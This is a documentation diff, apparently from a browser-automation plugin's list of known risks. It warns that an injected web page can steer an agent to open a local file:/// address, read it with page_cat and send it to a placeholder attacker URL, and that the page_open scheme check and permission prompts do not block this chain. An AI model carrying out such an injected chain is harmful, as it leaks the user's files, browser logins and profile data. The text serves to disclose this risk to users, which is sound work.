@@ -222,9 +222,11 @@ Record the result in the PR.
 - **A steered agent can read a local file and send it out, unasked.** With
   delegation, nothing stops this chain: an injected page makes the agent type
   `file:///…` with `window_input`, read it with `page_cat`, and send it with
-  `page_open https://attacker/?q=…`. Before delegation each step was a prompt.
-  Enable the plugin only if you accept this; the Chrome profile, the browser's
-  logins and the user's files are within its reach.
+  `page_open https://attacker/?q=…`. Before delegation, the two write steps
+  were each asked (refused under `never`; the Planner's `full` tier approves
+  prompts anyway), and `page_cat` was never asked. Enable the plugin only if
+  you accept this; the Chrome profile, the browser's logins and the user's
+  files are within its reach.
 - **`page_open` takes web URLs only, but that is no boundary.** It refuses
   `file:`, `chrome:` and other schemes, yet `window_input` can type any
   address into Chrome's address bar, `file:///` included, and `page_cat` then
@@ -249,9 +251,9 @@ Record the result in the PR.
   refuse with `-32409` until one is closed.
 - **Window churn ends sessions.** A new window of the app, or closing the
   window a viewer streams, ends that viewer's session so it reconnects to the
-  newest window; a page that
-  keeps opening and closing popups makes the Report block reconnect over and
-  over, and the viewer backs off up to 10 seconds between empty sessions.
+  newest window; a page that keeps opening and closing popups makes the Report
+  block reconnect over and over, and the viewer backs off up to 10 seconds
+  between empty sessions.
 - **Shared seat.** The owner's and the agents' input interleave; the last
   input wins.
 - **Model image receipt unverified.** Whether Codex or Claude pass the
